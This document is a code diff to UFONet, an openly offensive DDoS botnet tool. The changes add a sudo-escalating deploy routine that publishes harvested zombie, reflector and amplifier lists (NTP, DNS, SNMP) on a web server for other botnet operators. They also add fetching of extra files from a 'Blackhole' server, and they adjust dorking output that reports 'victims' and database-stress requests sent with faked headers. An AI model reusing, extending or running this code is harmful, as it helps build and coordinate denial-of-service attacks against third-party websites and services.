@@ -81,6 +81,7 @@ class UFONet(object):
         self.streams_file = "data/streams.txt" # set source path to retrieve [Blackhole] [Streams]
         self.globalnet_file = "data/globalnet.txt" # set source path to retrieve [Blackhole] [Globalnet]
         self.news_file = "data/news.txt" # set source path to retrieve [Blackhole] [News]
+        self.tv_file = "data/tv.txt" # set source path to retrieve [Blackhole] [TV]
         self.missions_file = "data/missions.txt" # set source path to retrieve [Blackhole] [Missions]
         self.board_file = "data/board.txt" # set source path to retrieve [Blackhole] [Board]
         self.grid_file = "data/grid.txt" # set source path to retrieve [Blackhole] [Grid]
@@ -91,6 +92,15 @@ class UFONet(object):
         self.port = "8080" # default injection port
         self.mothershipname = "core/txt/shipname.txt"
         self.default_mothership_name = "l4m3r-lulz/0\n" # default mothership name
+        self.mothership_model_file = 'core/txt/model.txt' # set source for mothership model
+        self.warping_path = '/var/www/ufonet' # set source for warping path
+        self.warping_folder_permissions = 0o644 # set permission for warping folder
+        f = open(self.mothership_model_file) # extract mothership model
+        self.mothership_model = f.readlines()
+        for model in self.mothership_model:
+            model = model.rstrip('\n')
+        self.mothership_model = model
+        f.close()
         self.mothership_baptism() # generating static name/id for your mothership ;-)
         self.head = False
         self.payload = False
@@ -193,10 +203,10 @@ class UFONet(object):
         return self.options
 
     def banner_welcome(self):
-        print("")
-        print("          ||          /\        ||              #===============================================#")
+        print("                     ____                                                                        ")
+        print("          ||        / /\ \      ||              #===============================================#")
         print("        -(00)-     + (XX) +   -(00)-            ||                                             ||")
-        print("   ||     ||      *~~~~~~~~*    ||        ||    ||  > Botnet [DDoS]   #  > Close Combat [DoS]  ||")
+        print("   ||     ||   O ==*~~~~~~*== 0 ||        ||    ||  > Botnet [DDoS]   #  > Close Combat [DoS]  ||")
         print(" -(00)-          (0)  XX  (0)           -(00)-  ||                                             ||")
         print("   ||             \| (00) |/              ||    ||     |-> ZOMBIES    #     |-> LOIC           ||")
         print("        (O)_  (O)  0'----'0  (O)  _(O)          ||     |-> DROIDS     #     |-> LORIS          ||")   
@@ -214,7 +224,7 @@ class UFONet(object):
         print("     '.__ ____0_'.|__'--'__|.'_0____ __.'       #|=============================================|#")
         print("    .'_.-|            YY            |-._'.      ||                                             ||")
         print("                                                ||  -> [ UFONet: https://ufonet.03c8.net ] <-  ||") 
-        print("    + Class: PSYoPs / ViPR404+ (model I^) +     ||                                             ||")
+        print("   + Class: PSYoPs / "+str(self.mothership_model)+" +     ||                                             ||")
         print("                                                #|=============================================|#") 
         print("")
 
@@ -318,9 +328,9 @@ class UFONet(object):
             self.agents.append(agent)
         self.user_agent = random.choice(self.agents).strip()
         self.search_engines = [] # available dorking search engines
-        self.search_engines.append('bing') # [01/02/2020: OK!]
-        self.search_engines.append('yahoo') # [01/02/2020: OK!]
-        self.search_engines.append('duck') # [01/02/2020: OK!]
+        self.search_engines.append('bing') # [13/07/2021: OK!]
+        self.search_engines.append('yahoo') # [13/07/2021: OK!]
+        self.search_engines.append('duck') # [13/07/2021: OK!]
         #self.search_engines.append('startpage') # [01/02/2020: deprecated! -> blocking instream params search]
         #self.search_engines.append('yandex') # [03/02/2018: deprecated! -> captchasound]
         #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
@@ -1305,6 +1315,135 @@ class UFONet(object):
         if options.web:
             self.create_web_interface()
             return
+
+        # deploy data to share in [/var/www/ufonet]
+        if options.deploy is not None:
+            self.banner()
+            euid = self.checkeuid()
+            if euid != 0:
+                print("\n[Info] [AI] [Control] [DEPLOY] (--deploy) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass
+            try:
+                print("\n[AI] Trying to deploy data to share in: '"+self.warping_path+"'\n")
+                np = r''+self.warping_path+'' 
+                if not os.path.exists(np):
+                    os.makedirs(np)
+                    print("[AI] Created folder at: '"+self.warping_path+"'\n")
+                else:
+                    print("[AI] Path to folder: '"+self.warping_path+"' exists! -> [PASSING!]\n")
+                from pathlib import Path # import pathlib
+                import shutil # import shutil
+                src = 'data/'
+                files=os.listdir(src)
+                print("[AI] GUI [Data] has been deployed...\n")
+                for fname in files:
+                    shutil.copy2(os.path.join(src,fname), self.warping_path)
+                    print("   - "+fname+" -> "+self.warping_path+"/"+fname)
+                    os.chmod(self.warping_path+"/"+fname, self.warping_folder_permissions)
+                print("")
+                src2 = 'botnet/'
+                files=os.listdir(src2)
+                print("[AI] CORE [Botnet] has been deployed...\n")
+                for fname in files:
+                    shutil.copy2(os.path.join(src2,fname), self.warping_path)
+                    if fname == 'zombies.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"abductions.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"abductions.txt.gz")
+                        os.chmod(self.warping_path+"/"+"abductions.txt.gz", self.warping_folder_permissions)
+                    if fname == 'aliens.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"troops.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"troops.txt.gz")
+                        os.chmod(self.warping_path+"/"+"troops.txt.gz", self.warping_folder_permissions)
+                    if fname == 'droids.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"robots.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"robots.txt.gz")
+                        os.chmod(self.warping_path+"/"+"robots.txt.gz", self.warping_folder_permissions)
+                    if fname == 'ucavs.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"drones.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"drones.txt.gz")
+                        os.chmod(self.warping_path+"/"+"drones.txt.gz", self.warping_folder_permissions)
+                    if fname == 'rpcs.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"reflectors.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"reflectors.txt.gz")
+                        os.chmod(self.warping_path+"/"+"reflectors.txt.gz", self.warping_folder_permissions)
+                    if fname == 'snmp.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"bosons.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"bosons.txt.gz")
+                        os.chmod(self.warping_path+"/"+"bosons.txt.gz", self.warping_folder_permissions)
+                    if fname == 'ntp.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"crystals.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"crystals.txt.gz")
+                        os.chmod(self.warping_path+"/"+"crystals.txt.gz", self.warping_folder_permissions)
+                    if fname == 'dns.txt':
+                        in_file = self.warping_path+"/"+fname
+                        in_data = open(in_file, "rb").read()
+                        out_gz = self.warping_path+"/"+"warps.txt.gz"
+                        gzf = gzip.open(out_gz, "wb")
+                        gzf.write(in_data)
+                        gzf.close()
+                        os.unlink(in_file)
+                        print("   - "+fname+" -> "+self.warping_path+"/"+"warps.txt.gz")
+                        os.chmod(self.warping_path+"/"+"warps.txt.gz", self.warping_folder_permissions)
+                    if fname == 'dorks.txt':
+                        print("   - "+fname+" -> "+self.warping_path+"/"+fname)
+                        os.chmod(self.warping_path+"/"+fname, self.warping_folder_permissions)
+                print("")
+                print("[AI] [Info] [Control] [DEPLOY] Files are ready to be shared with other 'motherships'...\n\n[AI] [Info] [DEPLOY] Other requirements:\n")
+                print("   - 1) Setup web server (apache, nginx...)")
+                print("   - 2) Make your web server accessible from the Internet (NAT/VPS) <-> ex: 'http(s)://<your ip>/ufonet/'")
+                print("     - 3a) Start [Blackhole] with: './ufonet --blackhole' (or python3 ufonet --blackhole &)")
+                print("     - 3b) Start [Grider] with: './ufonet --grider' (or python3 ufonet --grider &)")
+                print("   - 4) Share your IP on the sneaknet! (ex: SHIP.RADAR) ;-)")
+                print("")
+            except Exception as e:
+                print("[Error] "+str(e))
+                print("\n[AI] Something was wrong deploying in: '/var/www/ufonet'... -> [Aborting!]\n")
 
         # generate [Blackhole] server to share [Zombies]
         if options.blackhole is not None:
@@ -2311,6 +2450,8 @@ class UFONet(object):
         if self.options.forcessl:
             news = urllib.request.Request('https://'+self.blackhole+'/ufonet/news.txt', None, headers) 
             news_reply = urllib.request.urlopen(news, context=self.ctx, timeout=timeout).read().decode('utf-8')
+            tv = urllib.request.Request('https://'+self.blackhole+'/ufonet/tv.txt', None, headers)
+            tv_reply = urllib.request.urlopen(tv, context=self.ctx, timeout=timeout).read().decode('utf-8')
             missions = urllib.request.Request('https://'+self.blackhole+'/ufonet/missions.txt', None, headers)                         
             missions_reply = urllib.request.urlopen(missions, context=self.ctx, timeout=timeout).read().decode('utf-8')
             board = urllib.request.Request('https://'+self.blackhole+'/ufonet/board.txt', None, headers)
@@ -2328,6 +2469,8 @@ class UFONet(object):
         else:
             news = urllib.request.Request('http://'+self.blackhole+'/ufonet/news.txt', None, headers)
             news_reply = urllib.request.urlopen(news, context=self.ctx).read().decode('utf-8')
+            tv = urllib.request.Request('http://'+self.blackhole+'/ufonet/tv.txt', None, headers)
+            tv_reply = urllib.request.urlopen(tv, context=self.ctx).read().decode('utf-8')
             missions = urllib.request.Request('http://'+self.blackhole+'/ufonet/missions.txt', None, headers)
             missions_reply = urllib.request.urlopen(missions, context=self.ctx).read().decode('utf-8')
             board = urllib.request.Request('http://'+self.blackhole+'/ufonet/board.txt', None, headers)
@@ -2344,6 +2487,9 @@ class UFONet(object):
             globalnet_reply = urllib.request.urlopen(globalnet, context=self.ctx).read().decode('utf-8')
         f = open(self.news_file, 'w')
         f.write(news_reply)
+        f.close()
+        f = open(self.tv_file, 'w')
+        f.write(tv_reply)
         f.close()
         f = open(self.missions_file, 'w')
         f.write(missions_reply)
@@ -2382,6 +2528,8 @@ class UFONet(object):
             print("[Info] [AI] [Links]    : OK!")
         if streams_reply:
             print("[Info] [AI] [Streams]  : OK!")
+        if tv_reply:
+            print("[Info] [AI] [TV]       : OK!")
         if globalnet_reply:
             print("[Info] [AI] [GlobalNet]: OK!")
         print('-'*25)
@@ -2489,9 +2637,6 @@ class UFONet(object):
             if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "" and bosons_reply == "":
                 print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
                 print('-'*12 + '\n')
-                print("[Info] [AI] You can try to download [Zombies] from a different [Blackhole] [Server] (provided by someone!) with:\n\n ex: ufonet --down-from '<IP>'")
-                print("\nOr/And from a [Blackhole] [GitHub] with:\n\n ex: ufonet --download-github")
-                print('-'*12 + '\n')
                 print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [Server] -> [Exiting!]\n")
                 return
             f = open('botnet/abductions.txt.gz', 'wb')
@@ -2521,9 +2666,6 @@ class UFONet(object):
             print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX READY!] ;-)")
         except:
             print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
-            print('-'*12 + '\n')
-            print("[Info] [AI] You can try to download [Zombies] from a different [Blackhole] [Server] (provided by someone!) with:\n\n ex: ufonet --down-from '<IP>'")
-            print("\nOr/And from a [Blackhole] [GitHub] with:\n\n ex: ufonet --download-github")
             print('-'*12 + '\n')
             print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [Server] -> [Exiting!]\n")
             return
@@ -3141,8 +3283,7 @@ class UFONet(object):
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if options.verbose:
-                print("[Info] [AI] Query used: " + url)
-                print("\n" + '-'*44 + '\n')
+                print(("[Info] [AI] [DORKING] Query used: " + url + "\n"))
             try:
                 if options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
@@ -3196,7 +3337,7 @@ class UFONet(object):
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if options.verbose:
-                print(("Query used: " + url + "\n"))
+                print(("[Info] [AI] [DORKING] Query used: " + url + "\n"))
             try:
                 if options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
@@ -3237,7 +3378,7 @@ class UFONet(object):
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if options.verbose:
-                print("Query used: " + url + " (POST: "+ data + ")\n")
+                print("[Info] [AI] [DORKING] Query used: " + url + " (POST: "+ data + ")\n")
             try:
                 if options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
@@ -3324,18 +3465,17 @@ class UFONet(object):
             else:
                 if url_link not in zombies and url_link+os.linesep not in zombies_found and url_link != "": # AI mode (parsing search engines mixed pool and stored army)
                     print('+Victim found: ' + url_link)
-                    print('-'*12)
                     zombies.append(url_link)
                 else:
                     pass
         if len(zombies) == 0: # print dorking results
-            print("[Info] [AI] NOT any NEW victim(s) found for this query!")
+            print("[Info] [AI] NOT any NEW victim(s) found for this query!\n")
             if not options.dorks:
                 if not options.autosearch:
                     if not self.options.forceyes:
                         return #sys.exit(2)
-        print("\n" + '-'*44 + '\n')
         self.total_possible_zombies = self.total_possible_zombies + len(zombies)
+        print("")
         return zombies
 
     def check_nat(self):
@@ -5054,9 +5194,9 @@ class UFONet(object):
             length = 1 # search for one different (alphanumeric) character each time will produces more positive results on db
         key = str(random_key(length))
         if self.db_flash > 9:
-            print("[Info] [DBStress] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)")
+            print("[Info] [AI] [DBStress] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)")
         else:
-            print("[Info] [DBStress] Trying database request to: " + db_input + " | Query used: " + key)
+            print("[Info] [AI] [DBStress] Trying database request to: " + db_input + " | Query used: " + key)
         self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         if not target.endswith('/'): # add "/" to end of target
@@ -5069,15 +5209,15 @@ class UFONet(object):
             req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
         except urllib.error.HTTPError as e:
             if e.code == 401:
-                print('[Info] [DBStress] Not authorized')
+                print('[Info] [AI] [DBStress] Not authorized')
             elif e.code == 404:
-                print('[Info] [DBStress] Not found')
+                print('[Info] [AI] [DBStress] Not found')
             elif e.code == 503:
-                print('[Info] [DBStress] Service unavailable')
+                print('[Info] [AI] [DBStress] Service unavailable')
             else:
-                print('[Info] [DBStress] Unknown error')
+                print('[Info] [AI] [DBStress] Unknown error')
         else:
-            print('[Info] [DBStress] Database query: HIT!')
+            print('[Info] [AI] [DBStress] Database query: HIT!')
 
     def attackme(self, zombies):
         # perform a DDoS Web attack against yourself
